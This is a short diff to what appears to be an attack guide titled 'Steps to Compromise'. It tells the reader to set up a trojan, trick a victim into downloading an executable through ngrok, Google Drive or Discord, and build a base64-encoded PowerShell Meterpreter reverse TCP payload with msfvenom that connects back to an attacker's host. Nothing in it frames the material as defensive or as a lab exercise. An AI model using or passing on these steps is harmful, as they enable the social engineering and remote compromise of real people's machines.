@@ -5,7 +5,7 @@
 ## Steps to Compromise:
 
 1. **Setup Trojan Horse.** 
-2. **Get creative and get victim to download .bat file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
+2. **Get creative. Have victim download "exe" file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
 3. **Generate the payload:** <br>
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -i 2 -e cmd/powershell_base64 -f ps1
